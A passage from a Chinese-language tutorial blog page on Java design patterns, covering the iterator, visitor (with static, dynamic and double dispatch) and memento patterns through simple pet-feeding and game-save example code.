class="title">Iterator</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> cursor;       <span class="comment">// 下一个要返回元素的索引</span></span><br><span class="line">        <span class="keyword">int</span> lastRet = -<span class="number">1</span>; <span class="comment">// 上一个返回元素的索引</span></span><br><span class="line">        <span class="keyword">int</span> expectedModCount = modCount;</span><br><span class="line"></span><br><span class="line">        Itr() &#123;&#125;</span><br><span class="line">		</span><br><span class="line">        <span class="comment">//判断是否还有元素</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> cursor != size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取下一个元素</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> E <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            checkForComodification();</span><br><span class="line">            <span class="keyword">int</span> i = cursor;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= size)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">            Object[] elementData = ArrayList.<span class="keyword">this</span>.elementData;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= elementData.length)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">            cursor = i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> (E) elementData[lastRet = i];</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这部分代码还是比较简单，大致就是在 <code>iterator</code> 方法中返回了一个实例化的 <code>Iterator</code> 对象。Itr是一个内部类，它实现了 <code>Iterator</code> 接口并重写了其中的抽象方法。</p>
<blockquote>
<p>注意： </p>
<p>​    当我们在使用JAVA开发的时候，想使用迭代器模式的话，只要让我们自己定义的容器类实现<code>java.util.Iterable</code>并实现其中的iterator()方法使其返回一个 <code>java.util.Iterator</code> 的实现类就可以了。</p>
</blockquote>
<h4 id="访问者模式"><a href="#访问者模式" class="headerlink" title="访问者模式"></a>访问者模式</h4><p><strong>定义：</strong></p>
<p>封装一些作用于某种数据结构中的各元素的操作，它可以在不改变这个数据结构的前提下定义作用于这些元素的新的操作。</p>
<h5 id="结构-2"><a href="#结构-2" class="headerlink" title="结构"></a>结构</h5><p>访问者模式包含以下主要角色:</p>
<ul>
<li>抽象访问者（Visitor）角色：定义了对每一个元素<code>（Element）</code>访问的行为，它的参数就是可以访问的元素，它的方法个数理论上来讲与元素类个数（Element的实现类个数）是一样的，从这点不难看出，访问者模式要求元素类的个数不能改变。</li>
<li>具体访问者（ConcreteVisitor）角色：给出对每一个元素类访问时所产生的具体行为。</li>
<li>抽象元素（Element）角色：定义了一个接受访问者的方法（<code>accept</code>），其意义是指，每一个元素都要可以被访问者访问。</li>
<li>具体元素（ConcreteElement）角色： 提供接受访问方法的具体实现，而这个具体的实现，通常情况下是使用访问者提供的访问该元素类的方法。</li>
<li><strong>对象结构（Object Structure）角色</strong>：定义当中所提到的对象结构，对象结构是一个抽象表述，具体点可以理解为一个具有容器性质或者复合对象特性的类，它会含有一组元素（<code>Element</code>），并且可以迭代这些元素，供访问者访问。</li>
</ul>
<h5 id="案例实现-8"><a href="#案例实现-8" class="headerlink" title="案例实现"></a>案例实现</h5><p>【例】给宠物喂食</p>
<p>现在养宠物的人特别多，我们就以这个为例，当然宠物还分为狗，猫等，要给宠物喂食的话，主人可以喂，其他人也可以喂食。</p>
<ul>
<li>访问者角色：给宠物喂食的人</li>
<li>具体访问者角色：主人、其他人</li>
<li>抽象元素角色：动物抽象类</li>
<li>具体元素角色：宠物狗、宠物猫</li>
<li>结构对象角色：主人家</li>
</ul>
<p>类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-26-15-52-38.png" style="zoom:80%">

<p>代码如下：</p>
<p>创建抽象访问者接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">feed</span><span class="params">(Cat cat)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">feed</span><span class="params">(Dog dog)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建不同的具体访问者角色（主人和其他人），都需要实现 <code>Person</code>接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Owner</span> <span class="keyword">implements</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">feed</span><span class="params">(Cat cat)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;主人喂食猫&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">feed</span><span class="params">(Dog dog)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;主人喂食狗&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Someone</span> <span class="keyword">implements</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">feed</span><span class="params">(Cat cat)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;其他人喂食猫&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">feed</span><span class="params">(Dog dog)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;其他人喂食狗&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义抽象节点 – 宠物</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">accept</span><span class="params">(Person person)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义实现<code>Animal</code>接口的 具体节点（元素）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">implements</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(Person person)</span> </span>&#123;</span><br><span class="line">        person.feed(<span class="keyword">this</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;好好吃，汪汪汪！！！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">implements</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(Person person)</span> </span>&#123;</span><br><span class="line">        person.feed(<span class="keyword">this</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;好好吃，喵喵喵！！！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义对象结构，此案例中就是主人的家</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Home</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Animal&gt; nodeList = <span class="keyword">new</span> ArrayList&lt;Animal&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">action</span><span class="params">(Person person)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Animal node : nodeList) &#123;</span><br><span class="line">            node.accept(person);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加操作</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Animal animal)</span> </span>&#123;</span><br><span class="line">        nodeList.add(animal);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>测试类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Home home = <span class="keyword">new</span> Home();</span><br><span class="line">        home.add(<span class="keyword">new</span> Dog());</span><br><span class="line">        home.add(<span class="keyword">new</span> Cat());</span><br><span class="line"></span><br><span class="line">        Owner owner = <span class="keyword">new</span> Owner();</span><br><span class="line">        home.action(owner);</span><br><span class="line"></span><br><span class="line">        Someone someone = <span class="keyword">new</span> Someone();</span><br><span class="line">        home.action(someone);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="优缺点-2"><a href="#优缺点-2" class="headerlink" title="优缺点"></a>优缺点</h5><ul>
<li><p><strong>优点：</strong></p>
<ul>
<li>扩展性好<br>在不修改对象结构中的元素的情况下，为对象结构中的元素添加新的功能。</li>
</ul>
</li>
</ul>
<ul>
<li>复用性好<br>通过访问者来定义整个对象结构通用的功能，从而提高复用程度。</li>
</ul>
<ul>
<li>分离无关行为<br>通过访问者来分离无关的行为，把相关的行为封装在一起，构成一个访问者，这样每一个访问者的功能都比较单一。</li>
</ul>
<ul>
<li><p><strong>缺点：</strong></p>
<ul>
<li><p>对象结构变化很困难</p>
<p>在访问者模式中，每<strong>增加一个新的元素类，都要在每一个具体访问者类中增加相应的具体操作，这违背了“开闭原则”</strong>。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p><strong>违反了依赖倒置原则</strong></p>
<p>访问者模式依赖了具体类，而没有依赖抽象类。</p>
</li>
</ul>
<p><strong>使用场景</strong></p>
<ul>
<li><p><strong>对象结构相对稳定，但其操作算法经常变化的程序</strong>。</p>
</li>
<li><p>对象结构中的对象需要提供多种不同且不相关的操作，而且要<strong>避免让这些操作的变化影响对象的结构</strong>。</p>
</li>
</ul>
<h5 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h5><p>访问者模式用到了一种<strong>双分派</strong>的技术。</p>
<ol>
<li><strong>分派：</strong></li>
</ol>
<p>变量被==声明时的类型叫做变量的静态类型==，有些人又把静态类型叫做明显类型；而==变量所引用的对象的真实类型又叫做变量的实际类型==。比如 <code>Map map = new HashMap()</code> ，map变量的静态类型是 <code>Map</code> ，实际类型是 <code>HashMap</code> 。根据对象的类型而对方法进行的选择，就是分派(Dispatch)，分派(Dispatch)又分为两种，即静态分派和动态分派。</p>
<p><strong>静态分派(Static Dispatch)</strong> 发生在编译时期，分派根据静态类型信息发生。静态分派对于我们来说并不陌生，方法重载就是静态分派。</p>
<p><strong>动态分派(Dynamic Dispatch)</strong> 发生在运行时期，动态分派动态地置换掉某个方法。Java通过方法的重写支持动态分派。</p>
<ol start="2">
<li><strong>动态分派：</strong></li>
</ol>
<p>==通过方法的重写支持动态分派。==</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animal&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;dog&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;cat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">   	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Animal a = <span class="keyword">new</span> Dog();</span><br><span class="line">        a.execute();</span><br><span class="line">        </span><br><span class="line">        Animal a1 = <span class="keyword">new</span> Cat();</span><br><span class="line">        a1.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码的结果大家应该直接可以说出来，这不就是多态吗！运行执行的是子类中的方法。</p>
<p>Java编译器在编译时期并不总是知道哪些代码会被执行，因为编译器仅仅知道对象的静态类型，而不知道对象的真实类型；而方法的调用则是根据对象的真实类型，而不是静态类型。</p>
<ol start="3">
<li><strong>静态分派：</strong></li>
</ol>
<p>==通过方法重载支持静态分派。==</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Execute</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(Animal a)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animal&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(Dog d)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;dog&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(Cat c)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;cat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Animal a = <span class="keyword">new</span> Animal();</span><br><span class="line">        Animal a1 = <span class="keyword">new</span> Dog();</span><br><span class="line">        Animal a2 = <span class="keyword">new</span> Cat();</span><br><span class="line"></span><br><span class="line">        Execute exe = <span class="keyword">new</span> Execute();</span><br><span class="line">        exe.execute(a);</span><br><span class="line">        exe.execute(a1);</span><br><span class="line">        exe.execute(a2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-26-15-49-08.png" style="zoom:70%;" />

<p>这个结果可能出乎一些人的意料了，为什么呢？</p>
<p><strong>重载方法的分派是根据静态类型进行的，这个分派过程在编译时期就完成了。</strong></p>
<ol start="4">
<li><strong>双分派：</strong></li>
</ol>
<p>所谓双分派技术就是在选择一个方法的时候，不仅仅要根据消息接收者（receiver）的运行时区别，还要根据参数的运行时区别。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(Execute exe)</span> </span>&#123;</span><br><span class="line">        exe.execute(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(Execute exe)</span> </span>&#123;</span><br><span class="line">        exe.execute(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(Execute exe)</span> </span>&#123;</span><br><span class="line">        exe.execute(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Execute</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(Animal a)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;animal&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(Dog d)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;dog&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(Cat c)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;cat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Animal a = <span class="keyword">new</span> Animal();</span><br><span class="line">        Animal d = <span class="keyword">new</span> Dog();</span><br><span class="line">        Animal c = <span class="keyword">new</span> Cat();</span><br><span class="line"></span><br><span class="line">        Execute exe = <span class="keyword">new</span> Execute();</span><br><span class="line">        a.accept(exe);</span><br><span class="line">        d.accept(exe);</span><br><span class="line">        c.accept(exe);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上面代码中，客户端将Execute对象做为参数传递给Animal类型的变量调用的方法，这里完成第一次分派，这里是方法重写，所以是动态分派，也就是执行实际类型中的方法，同时也<code>将自己this作为参数传递进去，这里就完成了第二次分派</code>，这里的Execute类中有多个重载的方法，而传递进行的是this，就是具体的实际类型的对象。</p>
<p>说到这里，我们已经明白双分派是怎么回事了，但是它有什么效果呢？就是可以实现方法的动态绑定，我们可以对上面的程序进行修改。</p>
<p>运行结果如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-26-15-48-58.png" style="zoom:67%;" />

<p><strong>双分派实现动态绑定的本质，就是在重载方法委派（静态分派）的前面加上了继承体系中覆盖（重写）（动态分派）的环节，由于覆盖是动态的，所以重载就是动态的了。</strong></p>
<h4 id="备忘录模式"><a href="#备忘录模式" class="headerlink" title="备忘录模式"></a>备忘录模式</h4><p><strong>概述</strong></p>
<p>备忘录模式提供了一种状态恢复的实现机制，使得用户可以方便地回到一个特定的历史步骤，当新的状态无效或者存在问题时，可以使用暂时存储起来的备忘录将状态复原，很多软件都提供了撤销（Undo）操作，如 Word、记事本、Photoshop、IDEA等软件在编辑时按 Ctrl+Z 组合键时能撤销当前操作，使文档恢复到之前的状态；还有在 浏览器 中的后退键、数据库事务管理中的回滚操作、玩游戏时的中间结果存档功能、数据库与操作系统的备份操作、棋类游戏中的悔棋功能等都属于这类。</p>
<p><strong>定义：</strong></p>
<p>又叫==快照模式==，在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态，以便以后当需要时能将该对象恢复到原先保存的状态。</p>
<h5 id="结构-3"><a href="#结构-3" class="headerlink" title="结构"></a>结构</h5><p>备忘录模式的主要角色如下：</p>
<ul>
<li>发起人（Originator）角色：记录当前时刻的内部状态信息，提供创建备忘录和恢复备忘录数据的功能，实现其他业务功能，它可以访问备忘录里的所有信息。</li>
<li>备忘录（Memento）角色：负责存储发起人的内部状态，在需要的时候提供这些内部状态给发起人。</li>
<li>管理者（Caretaker）角色：对备忘录进行管理，提供保存与获取备忘录的功能，但其不能对备忘录的内容进行访问与修改。</li>
</ul>
<blockquote>
<p>备忘录有两个等效的接口：</p>
<ul>
<li><strong>窄接口</strong>：管理者(Caretaker)对象（和其他发起人对象之外的任何对象）看到的是备忘录的窄接口(narror Interface)，这个窄接口只允许他把备忘录对象传给其他的对象。</li>
<li><strong>宽接口</strong>：与管理者看到的窄接口相反，发起人对象可以看到一个宽接口(wide Interface)，这个宽接口允许它读取所有的数据，以便根据这些数据恢复这个发起人对象的内部状态。</li>
</ul>
</blockquote>
<p><strong>案例实现</strong></p>
<p>【例】游戏挑战BOSS</p>
<p>游戏中的某个场景，一游戏角色有生命力、攻击力、防御力等数据，在打Boss前和后一定会不一样的，我们允许玩家如果感觉与Boss决斗的效果不理想可以让游戏恢复到决斗之前的状态。</p>
<p>要实现上述案例，有两种方式：</p>
<ul>
<li>“白箱”备忘录模式</li>
<li>“黑箱”备忘录模式</li>
</ul>
<h5 id="“白箱”备忘录模式"><a href="#“白箱”备忘录模式" class="headerlink" title="“白箱”备忘录模式"></a>“白箱”备忘录模式</h5><p>备忘录角色对任何对象都提供一个接口，即宽接口，备忘录角色的内部所存储的状态就对所有对象公开。类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-26-16-44-20.png" style="zoom:80%;" />

<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//游戏角色类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GameRole</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> vit; <span class="comment">//生命力</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> atk; <span class="comment">//攻击力</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> def; <span class="comment">//防御力</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化状态</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.vit = <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">this</span>.atk = <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">this</span>.def = <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//战斗</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fight</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.vit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.atk = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.def = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存角色状态</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RoleStateMemento <span class="title">saveState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RoleStateMemento(vit, atk, def);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//回复角色状态</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">recoverState</span><span class="params">(RoleStateMemento roleStateMemento)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.vit = roleStateMemento.getVit();</span><br><span class="line">        <span class="keyword">this</span>.atk = roleStateMemento.getAtk();</span><br><span class="line">        <span class="keyword">this</span>.def = roleStateMemento.getDef();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stateDisplay</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;角色生命力：&quot;</span> + vit);</span><br><span class="line">        System.out.println(<span class="string">&quot;角色攻击力：&quot;</span> + atk);</span><br><span class="line">        System.out.println(<span class="string">&quot;角色防御力：&quot;</span> + def);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getVit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> vit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setVit</span><span class="params">(<span class="keyword">int</span> vit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.vit = vit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAtk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> atk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAtk</span><span class="params">(<span class="keyword">int</span> atk)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.atk = atk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getDef</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> def;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDef</span><span class="params">(<span class="keyword">int</span> def)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.def = def;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//游戏状态存储类(备忘录类)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RoleStateMemento</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> vit;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> atk;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> def;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RoleStateMemento</span><span class="params">(<span class="keyword">int</span> vit, <span class="keyword">int</span> atk, <span class="keyword">int</span> def)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.vit = vit;</span><br><span class="line">        <span class="keyword">this</span>.atk = atk;</span><br><span class="line">        <span class="keyword">this</span>.def = def;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getVit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> vit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setVit</span><span class="params">(<span class="keyword">int</span> vit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.vit = vit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> 